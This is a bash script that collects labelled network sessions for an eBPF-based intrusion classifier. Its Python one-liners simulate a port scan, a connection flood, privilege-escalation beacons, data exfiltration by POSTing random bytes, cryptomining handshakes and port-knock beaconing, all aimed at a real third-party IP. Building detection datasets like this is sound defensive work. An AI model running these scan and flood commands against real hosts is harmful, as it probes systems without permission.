#!/usr/bin/env bash
# collect_sessions.sh — run all attack categories and collect labelled CSV
# Usage: sudo bash collect_sessions.sh [interface]
set -euo pipefail

IFACE="${1:-ens3}"
BINARY="/home/ubuntu/ebpf-cla/ebpf-cla"
SIMDIR="/home/ubuntu/ebpf-cla/attack-sim"
OUTDIR="/home/ubuntu/ebpf-cla/results/raw"
CSV="$OUTDIR/sessions_$(date +%Y%m%d_%H%M%S).csv"
WARMUP_CSV="$OUTDIR/warmup_discard.csv"

echo "[collect] output → $CSV"
echo "[collect] interface: $IFACE"

run_phase() {
    local label="$1"
    local duration="$2"     # seconds to collect
    local traffic_cmd="${3:-}"

    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "[phase] $label (${duration}s)"

    sudo "$BINARY" "$IFACE" --csv "$CSV" --label "$label" \
        > "/tmp/cla_${label}.log" 2>&1 &
    local cla_pid=$!
    sleep 2   # wait for BPF attach

    if [ -n "$traffic_cmd" ]; then
        eval "$traffic_cmd" &
        local traffic_pid=$!
    fi

    sleep "$duration"

    [ -n "${traffic_pid:-}" ] && kill "$traffic_pid" 2>/dev/null || true
    sudo kill "$cla_pid" 2>/dev/null || true
    wait 2>/dev/null || true
    sleep 1

    local events
    events=$(tail -n +2 "$CSV" 2>/dev/null | grep -c ",$label," || echo 0)
    echo "[phase] $label → $events events written"
}

# ── Phase 0: Warmup — separate CSV, discarded ───────────────────────────
echo "[collect] warmup phase (build online-stats baseline)..."
sudo "$BINARY" "$IFACE" --csv "$WARMUP_CSV" --label "warmup" \
    > /tmp/cla_warmup.log 2>&1 &
WARMUP_PID=$!
sleep 2
for i in $(seq 1 20); do
    curl -s -o /dev/null http://example.com 2>/dev/null || true
    sleep 0.3
done
sudo kill $WARMUP_PID 2>/dev/null || true
wait 2>/dev/null || true
sleep 1
WARMUP_N=$(tail -n +2 "$WARMUP_CSV" 2>/dev/null | wc -l || echo 0)
echo "[collect] warmup: $WARMUP_N events seen (discarded)"

# ── Phase 1: Benign ──────────────────────────────────────────────────────
run_phase "benign" 45 \
    "for i in \$(seq 1 50); do curl -s -o /dev/null http://example.com 2>/dev/null || true; sleep 0.3; done"

# ── Phase 2: Port Scan ───────────────────────────────────────────────────
run_phase "portscan" 35 \
    "python3 -c \"
import socket
for port in range(1, 1025):
    try:
        s=socket.socket(); s.settimeout(0.05)
        s.connect(('93.184.216.34', port)); s.close()
    except: pass
print('[scan] done')
\""

# ── Phase 3: SYN Flood ───────────────────────────────────────────────────
run_phase "synflood" 30 \
    "python3 -c \"
import socket
for _ in range(300):
    try:
        s=socket.socket(); s.settimeout(0.05)
        s.connect(('93.184.216.34', 80)); s.close()
    except: pass
\""

# ── Phase 4: Privesc simulation ──────────────────────────────────────────
run_phase "privesc" 25 \
    "python3 -c \"
import socket, subprocess
for i in range(50): subprocess.run(['id'], capture_output=True)
for port in [4444,1337,31337,9999,8888]*4:
    try:
        s=socket.socket(); s.settimeout(0.1)
        s.connect(('93.184.216.34', port)); s.close()
    except: pass
\""

# ── Phase 5: Data Exfiltration ───────────────────────────────────────────
run_phase "exfil" 25 \
    "python3 -c \"
import socket, os, time
for _ in range(20):
    try:
        s=socket.socket(); s.settimeout(2.0)
        s.connect(('93.184.216.34', 80))
        s.sendall(b'POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 32768\r\n\r\n' + os.urandom(4096))
        time.sleep(0.1); s.close()
    except: pass
\""

# ── Phase 6: Cryptomining ────────────────────────────────────────────────
run_phase "cryptomining" 25 \
    "python3 -c \"
import socket, time
for cycle in range(8):
    for port in [3333,4444,14444,45700]:
        try:
            s=socket.socket(); s.settimeout(0.5)
            s.connect(('93.184.216.34', port))
            s.sendall(b'{\"method\":\"mining.subscribe\"}\n')
            time.sleep(0.05); s.close()
        except: pass
    time.sleep(0.2)
\""

# ── Phase 7: Rootkit / Beaconing ─────────────────────────────────────────
run_phase "rootkit" 30 \
    "python3 -c \"
import socket, time
# Port knock then beacon
for p in [7000,8000,9000,10000]:
    try: s=socket.socket(); s.settimeout(0.05); s.connect(('93.184.216.34',p)); s.close()
    except: pass
    time.sleep(0.05)
for _ in range(20):
    try: s=socket.socket(); s.settimeout(0.2); s.connect(('93.184.216.34',443)); s.close()
    except: pass
    time.sleep(0.3)
\""

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[collect] COMPLETE → $CSV"
TOTAL=$(tail -n +2 "$CSV" 2>/dev/null | wc -l || echo 0)
echo "[collect] total events: $TOTAL"
python3 -c "
import csv
from collections import Counter
rows = list(csv.DictReader(open('$CSV')))
c = Counter(r['label'] for r in rows)
for k,v in sorted(c.items()): print(f'  {k}: {v}')
" 2>/dev/null || true
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$CSV"
